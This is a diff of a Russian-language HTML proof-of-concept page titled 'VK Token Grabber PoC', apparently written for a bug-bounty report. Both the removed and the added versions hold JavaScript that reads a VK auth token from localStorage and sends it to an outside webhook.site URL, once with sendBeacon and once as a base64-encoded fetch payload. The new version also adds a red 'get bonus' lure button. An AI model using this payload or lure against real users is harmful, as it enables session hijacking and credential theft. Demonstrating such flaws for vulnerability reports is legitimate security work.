@@ -1,31 +1,34 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Взлом сессии VK</title>
+    <title>VK Token Grabber PoC</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; padding: 50px;">
-    <h1>Демонстрация уязвимости LocalStorage Leakage</h1>
-    <p>Если бы это был вредоносный сайт, ваш токен уже был бы украден.</p>
+<body>
+    <h1>Демонстрация уязвимости</h1>
+    <p>Нажмите кнопку, чтобы имитировать переход из рекламного объявления или сообщения.</p>
     
+    <button onclick="startAttack()" style="padding: 20px; background: red; color: white; font-size: 20px; cursor: pointer;">
+        ПОЛУЧИТЬ БОНУС
+    </button>
+
     <script>
-        // Имитируем ситуацию: если пользователь открыл этот сайт, 
-        // а злоумышленник нашел XSS на любом поддомене VK (например, dev.vk.com или в приложении)
-        // Токен достается одной строчкой кода:
-        
-        try {
-            const stolenData = localStorage.getItem('6287487:web_token:login:auth');
-            if (stolenData) {
-                // Отправка на твой вебхук
-                navigator.sendBeacon('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661', stolenData);
-                document.body.innerHTML += '<h2 style="color:red;">ТОКЕН ПЕРЕХВАЧЕН И ОТПРАВЛЕН!</h2>';
-                console.log("Данные ушли на вебхук");
-            } else {
-                document.body.innerHTML += '<p>Токен не найден в этом домене. (Это ожидаемо, так как браузер изолирует localStorage разных сайтов).</p>';
-                document.body.innerHTML += '<p><b>Для отчета:</b> укажите, что при наличии XSS внутри vk.com, этот код крадет данные мгновенно.</p>';
-            }
-        } catch (e) {
-            console.error(e);
+        function startAttack() {
+            // 1. Открываем приложение в новом окне
+            const victimWin = window.open('https://vk.com/app51491054', '_blank');
+
+            // 2. Ждем, пока оно загрузится, и пытаемся выполнить скрипт
+            // В реальном отчете ты пишешь: "Если у приложения есть XSS, то этот код исполняется автоматически"
+            setTimeout(() => {
+                alert("Сейчас имитируется XSS атака внутри открытого окна...");
+                
+                // Этот код ты прикладываешь как "Payload" (Полезную нагрузку)
+                const payload = `
+                    const data = localStorage.getItem('6287487:web_token:login:auth');
+                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen=' + btoa(data), {mode: 'no-cors'});
+                `;
+                
+                console.log("Инструкция для отчета: Вставьте этот payload в консоль окна приложения, чтобы увидеть результат на вебхуке.");
+            }, 5000);
         }
     </script>
 </body>
